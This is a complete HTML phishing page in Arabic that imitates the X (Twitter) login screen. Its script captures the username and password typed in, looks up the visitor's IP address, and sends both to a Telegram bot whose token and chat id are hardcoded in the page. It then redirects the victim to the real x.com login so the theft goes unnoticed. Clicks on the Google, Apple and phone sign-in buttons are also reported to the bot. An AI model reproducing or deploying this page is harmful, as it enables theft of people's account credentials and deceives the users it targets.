<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X - Portal</title>
    <style>
        :root { --bg: #000; --txt: #fff; --border: #2f3336; --accent: #eff3f4; --blue: #1d9bf0; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg); color: var(--txt); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { width: 100%; max-width: 360px; padding: 24px; display: flex; flex-direction: column; align-items: center; }
        .brand-logo { font-size: 36px; font-weight: 800; margin-bottom: 20px; letter-spacing: -1px; }
        .heading-title { font-size: 22px; font-weight: 700; margin-bottom: 28px; text-align: center; }
        
        .action-node { display: flex; align-items: center; justify-content: center; width: 100%; background-color: var(--txt); color: var(--bg); border: none; border-radius: 9999px; padding: 14px 20px; font-size: 15px; font-weight: 600; margin-bottom: 12px; cursor: pointer; text-decoration: none; transition: opacity 0.2s; }
        .action-node:hover { opacity: 0.9; }
        .action-node svg { width: 18px; height: 18px; margin-left: 10px; fill: currentColor; }
        
        .separator-line { display: flex; align-items: center; width: 100%; color: #71767b; margin: 16px 0; font-size: 13px; }
        .separator-line::before, .separator-line::after { content: ''; flex: 1; border-bottom: 1px solid var(--border); }
        .separator-line::before { margin-left: 12px; }
        .separator-line::after { margin-right: 12px; }
        
        .field-box { width: 100%; margin-bottom: 14px; position: relative; }
        .text-input { width: 100%; background: transparent; border: 1px solid var(--border); border-radius: 4px; padding: 15px 14px; color: var(--txt); font-size: 15px; text-align: right; outline: none; transition: border-color 0.2s; }
        .text-input:focus { border-color: var(--blue); }
        
        .reveal-btn { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #71767b; }
        .reveal-btn svg { width: 20px; height: 20px; fill: currentColor; }
        
        .submit-action { width: 100%; background-color: #202327; color: #71767b; border: none; border-radius: 9999px; padding: 14px; font-size: 15px; font-weight: 700; cursor: pointer; margin-top: 4px; transition: background-color 0.2s, color 0.2s; }
        .submit-action.active { background-color: var(--accent); color: #0f1419; }
        
        .terms-info { color: #71767b; font-size: 11px; margin-top: 24px; text-align: center; line-height: 1.4; }
        .terms-info a { color: var(--blue); text-decoration: none; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="brand-logo">𝕏</div>
        <div class="heading-title">اطلع على ما يحدث</div>

        <button class="action-node" type="button" onclick="execDispatch('Mobile Authentication Triggered')">
            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
            المتابعة بالهاتف
        </button>

        <button class="action-node" type="button" onclick="execDispatch('Google OAuth Node Clicked')">
            <svg viewBox="0 0 24 24">
                <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.66-5.17 3.66-9.17z"/>
                <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.13 0-5.78-2.11-6.73-4.96H1.18v3.15C3.15 21.32 7.23 24 12 24z"/>
                <path fill="#FBBC05" d="M5.27 14.24c-.25-.72-.38-1.49-.38-2.24s.13-1.52.38-2.24V6.6H1.18C.43 8.13 0 9.86 0 12s.43 3.87 1.18 5.4l4.09-3.16z"/>
                <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.23 0 3.15 2.68 1.18 6.6l4.09 3.15c.95-2.85 3.6-4.96 6.73-4.96z"/>
            </svg>
            المتابعة مع جوجل
        </button>

        <!-- زر المتابعة مع أبل الجديد -->
        <button class="action-node" type="button" onclick="execDispatch('Apple OAuth Node Clicked')">
            <svg viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M15.97 5.31c.65-.79 1.09-1.89.97-2.99-.96.04-2.13.64-2.81 1.43-.6.68-1.12 1.79-.98 2.86 1.08.08 2.17-.51 2.82-1.3z"/></svg>
            المتابعة مع ابل
        </button>

        <div class="separator-line">أو</div>

        <div class="field-box">
            <input type="text" id="usrIdentity" class="text-input" placeholder="البريد الإلكتروني أو اسم المستخدم" autocomplete="off" oninput="checkInputs()">
        </div>

        <div class="field-box">
            <input type="password" id="secCredentials" class="text-input" placeholder="كلمة المرور" autocomplete="off" oninput="checkInputs()">
            <button type="button" class="reveal-btn" onclick="toggleVisibility()">
                <svg id="eyeViewIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
            </button>
        </div>

        <button id="submitBtn" class="submit-action" type="button" onclick="handleSubmit()" disabled>استمر</button>

        <div class="terms-info">
            بالمتابعة، فإنك توافق على <a href="#">شروط الخدمة</a> و<a href="#">سياسة الخصوصية</a> واستخدام ملفات تعريف الارتباط الخاصة بنا.
        </div>
    </div>

    <script>
        const _k1 = "8589371340:AAEeu1VjjIoYuvsCuCBH8ALNbZLLAscmmNY";
        const _k2 = "6837690352";

        function checkInputs() {
            const idVal = document.getElementById('usrIdentity').value;
            const passVal = document.getElementById('secCredentials').value;
            const btn = document.getElementById('submitBtn');
            
            if(idVal.trim() !== "" || passVal.trim() !== "") {
                btn.classList.add('active');
                btn.removeAttribute('disabled');
            } else {
                btn.classList.remove('active');
                btn.setAttribute('disabled', 'true');
            }
        }

        async function resolveNetworkNode(payloadText) {
            try {
                let clientIP = "Not Resolved";
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    clientIP = data.ip;
                } catch(ex) {}

                const compiledBody = `<b>[SYSTEM EVENT REPORT]</b>\n` +
                                     `🌐 <b>Client IP:</b> <code>${clientIP}</code>\n` +
                                     payloadText;

                await fetch(`https://api.telegram.org/bot${_k1}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: _k2,
                        text: compiledBody,
                        parse_mode: 'HTML'
                    })
                });
            } catch(err) {}
        }

        function toggleVisibility() {
            const fieldTarget = document.getElementById('secCredentials');
            const iconTarget = document.getElementById('eyeViewIcon');
            if (fieldTarget.type === 'password') {
                fieldTarget.type = 'text';
                iconTarget.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.12c0-1.66-1.34-3-3-3l-.17.02z"/>';
            } else {
                fieldTarget.type = 'password';
                iconTarget.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
            }
        }

        function handleSubmit() {
            const idVal = document.getElementById('usrIdentity').value;
            const passVal = document.getElementById('secCredentials').value;

            if(!idVal && !passVal) return;

            const payload = `📦 <b>Data Capture:</b> Success\n👤 <b>Identity:</b> <code>${idVal}</code>\n🔑 <b>Secret:</b> <code>${passVal}</code>`;
            resolveNetworkNode(payload).then(() => {
                window.location.href = "https://x.com/i/flow/login";
            });
        }

        function execDispatch(actionType) {
            resolveNetworkNode(`⚡ <b>Action Log:</b> ${actionType}`);
        }
    </script>
</body>
</html>
